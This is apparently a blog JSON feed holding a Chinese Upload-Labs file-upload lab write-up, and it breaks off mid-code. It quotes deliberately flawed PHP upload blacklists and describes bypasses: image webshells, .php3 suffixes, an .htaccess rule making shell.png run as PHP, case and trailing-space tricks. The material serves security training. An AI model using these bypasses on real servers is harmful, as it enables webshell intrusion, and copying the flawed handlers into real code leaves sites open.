{
    "version": "https://jsonfeed.org/version/1",
    "title": "千里稻花应秀色 • All posts by \"web安全\" category",
    "description": "blogs by SSR",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2022/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Upload-Labs/",
            "url": "http://example.com/2022/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Upload-Labs/",
            "title": "Upload Labs 文件上传",
            "date_published": "2022-03-28T10:39:27.000Z",
            "content_html": "<h1 id=\"upload-labs-文件上传\"><a class=\"markdownIt-Anchor\" href=\"#upload-labs-文件上传\">#</a> Upload-Labs 文件上传</h1>\n<p><img src=\"Upload-Labs/o_200315132712sum_up.png\" class=\"lazyload placeholder\" data-srcset=\"Upload-Labs/o_200315132712sum_up.png\" srcset=\"https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg\" alt=\"img\"></p>\n<h2 id=\"本地js检查\"><a class=\"markdownIt-Anchor\" href=\"#本地js检查\">#</a> 本地 js 检查</h2>\n<p>使用图片马.png</p>\n<p>允许的后缀上传 - 抓包 - 改后缀 - 上传成功</p>\n<p><strong>方法二 浏览器设置禁用 JS</strong></p>\n<h2 id=\"服务端对数据包的mime进行检查\"><a class=\"markdownIt-Anchor\" href=\"#服务端对数据包的mime进行检查\">#</a> 服务端对数据包的 MIME 进行检查</h2>\n<p>使用图片马.png 上传 - 抓包 - 改后缀 - 上传成功</p>\n<p>MIME (content-type) 类型还是图片，验证通过</p>\n<h2 id=\"黑名单基础过滤\"><a class=\"markdownIt-Anchor\" href=\"#黑名单基础过滤\">#</a> 黑名单基础过滤</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;.asp&#x27;</span>,<span class=\"string\">&#x27;.aspx&#x27;</span>,<span class=\"string\">&#x27;.php&#x27;</span>,<span class=\"string\">&#x27;.jsp&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span>. <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                 <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> .<span class=\"string\">&#x27;/&#x27;</span>. <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">                 <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>禁止 asp/aspx/php/jsp 类型上传，而且全转换为小写。利用 apache 解析漏洞。</p>\n<p>Apache 是从右到左开始判断解析，如果为不可识别解析，就再往左判断。</p>\n<p>php2\\php3\\php4 都会解析为 php</p>\n<p>抓包修改后缀.php3 上传成功</p>\n<h2 id=\"黑名单-htaccess攻击\"><a class=\"markdownIt-Anchor\" href=\"#黑名单-htaccess攻击\">#</a> 黑名单 (.htaccess 攻击)</h2>\n<p>Apache 漏洞</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;php1&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;pHp1&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//收尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 后缀文件</p>\n<p>这回多了不少后缀，第三关方法不行了（这些后缀可以收藏)</p>\n<p>没有禁止.htaccess 上传，我们可以写规则之后上传，上传的 shell.png 文件解析为 php，上传后连接</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;FilesMatch <span class=\"string\">&quot;shell.png&quot;</span>&gt;</span><br><span class=\"line\">SetHandler application/x-httpd-php</span><br><span class=\"line\">&lt;/FilesMatch&gt;   </span><br></pre></td></tr></table></figure>\n<p>ps:Nginx 类似操作是使用.user.ini, 思路与.htaccess 类似</p>\n<p>参考：<a href=\"https://www.cnblogs.com/NineOne/p/14033391.html\">https://www.cnblogs.com/NineOne/p/14033391.html</a></p>\n<h2 id=\"大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#大小写绕过\">#</a> 大小写绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>在第四关的基础上增加了.htaccess 的过滤，但是没有全部转化为小写的规则了</p>\n<p>大小写绕过</p>\n<h2 id=\"空格绕过\"><a class=\"markdownIt-Anchor\" href=\"#空格绕过\">#</a> 空格绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = deldot(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n<p>对比没有了首位去空格，修改后缀 php 再加个空格 /.php (空格)/</p>\n<h2 id=\"点绕过\"><a class=\"markdownIt-Anchor\" href=\"#点绕过\">#</a> 点绕过</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(<span class=\"variable\">$UPLOAD_ADDR</span>)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = trim(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strrchr(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = strtolower(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = str_ireplace(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = trim(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>], <span class=\"variable\">$UPLOAD_ADDR</span> . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>])) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = <span class=\"variable\">$UPLOAD_ADDR</span> . <span 